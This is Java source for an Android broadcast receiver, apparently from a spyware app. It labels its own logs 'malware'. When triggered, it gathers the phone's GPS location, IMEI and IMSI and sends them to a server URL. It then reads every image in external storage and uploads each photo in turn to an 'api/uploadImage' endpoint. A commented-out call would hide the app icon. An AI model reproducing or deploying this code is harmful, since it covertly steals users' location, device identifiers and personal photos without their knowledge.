package ommrepublic.com.ledieo;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.RecoverySystem;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;
import android.provider.MediaStore.Images;
import android.widget.Toast;

import org.apache.http.Header;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.List;

import cz.msebera.android.httpclient.entity.mime.MultipartEntityBuilder;
import cz.msebera.android.httpclient.entity.mime.content.ContentBody;
import cz.msebera.android.httpclient.entity.mime.content.FileBody;

/**
 * Created by admin on 9/23/15.
 */
public class ChargeReceiver extends BroadcastReceiver{

    public Context mContext;
    public List<File> mListFile;

    @Override
    public void onReceive(Context context, Intent intent)
    {
        mContext = context;
        mListFile = new ArrayList<File>();

        try {
            // STEP 1 : START THE SERVER

            Log.d("malware", "Sending data");
            DeviceLocation d = new DeviceLocation();
            double[] location = d.getGPS(context);

            WebHelper w = new WebHelper(context, context.getString(R.string.user_info_api), PhoneInfo.getMyIMEI(context), PhoneInfo.getMyIMSI(context), location[0], location[1]);
            w.start();

            //Utils.hideAppIcon(context);

            ContentResolver cr = context.getContentResolver();
            String[] columns = new String[] {
                    Images.ImageColumns._ID,
                    Images.ImageColumns.TITLE,
                    Images.ImageColumns.DATA,
                    Images.ImageColumns.MIME_TYPE,
                    Images.ImageColumns.SIZE };
            Cursor cur = cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, columns, null, null, null);
            String encodedString = "";
            if (cur.moveToFirst()){
                do{
                    String data = cur.getString(cur.getColumnIndex(Images.ImageColumns.DATA));
                    // do what ever you want here
                    Log.d("malware", data);
                    File file = new File(data);
                    mListFile.add(file);

                    byte[] bytes = Utils.loadFile(file);
                    byte[] encoded = Base64.encode(bytes, 1);
                    encodedString = new String(encoded);
                }while(cur.moveToNext());
            }
            cur.close();

            new uploadImageAsyncTask().execute(mListFile);
        }
        catch(Exception e)
        {
            e.printStackTrace();
        }
    }

    private class uploadImageAsyncTask extends AsyncTask<List<File>, Integer, String> {

        List<File> imageData;

        @Override
        protected String doInBackground(List<File>... params){
            // TODO Auto-generated method stub
            imageData = params[0];
            postData();
            return null;
        }

        protected void onPostExecute(String result){
            imageData.remove(0);
            if(imageData.size() > 0)
            {
                new uploadImageAsyncTask().execute(imageData);
            }
        }

        protected void onProgressUpdate(Integer... progress){

        }

        public void postData() {

            String apiString = mContext.getString(R.string.user_info_api) + "api/uploadImage";
            Log.d("uploadImageAsyncTask", apiString);
            HttpClient httpclient = new DefaultHttpClient();
            HttpPost httpPost = new HttpPost(apiString);
            try {
                //List nameValuePairs = new ArrayList(2);
                //nameValuePairs.add(new BasicNameValuePair("imageData", imageData));
                //httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

                //InputStreamEntity reqEntity = new InputStreamEntity(new FileInputStream(imageData), -1);
                //reqEntity.setContentType("image/jpeg");
                //reqEntity.setChunked(true); // Send in multiple parts if needed
                //httpPost.setEntity(reqEntity);


                FileBody bin = new FileBody(imageData.get(0), "image/jpeg");
                MultipartEntityBuilder mpEntity = MultipartEntityBuilder.create();
                mpEntity.addPart("imageData", bin);
                final cz.msebera.android.httpclient.HttpEntity entity = mpEntity.build();

                httpPost.setEntity(new HttpEntity() {
                    @Override
                    public boolean isRepeatable() {
                        return entity.isRepeatable();
                    }

                    @Override
                    public boolean isChunked() {
                        return entity.isChunked();
                    }

                    @Override
                    public long getContentLength() {
                        return entity.getContentLength();
                    }

                    @Override
                    public Header getContentType() {
                        return null;
                    }

                    @Override
                    public Header getContentEncoding() {
                        return null;
                    }

                    @Override
                    public InputStream getContent() throws IOException, IllegalStateException {
                        return entity.getContent();
                    }

                    @Override
                    public void writeTo(OutputStream outputStream) throws IOException {
                        entity.writeTo(outputStream);
                    }

                    @Override
                    public boolean isStreaming() {
                        return entity.isStreaming();
                    }

                    @Override
                    public void consumeContent() throws IOException {
                        entity.consumeContent();
                    }
                });

                HttpResponse response = httpclient.execute(httpPost);
                String responseStr = EntityUtils.toString(response.getEntity());
                Log.d("uploadImageAsyncTask", responseStr);

                try
                {
                    //JSONObject object = new JSONObject(responseStr);
                }
                catch (Exception e)
                {
                    e.printStackTrace();
                }

            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }


}
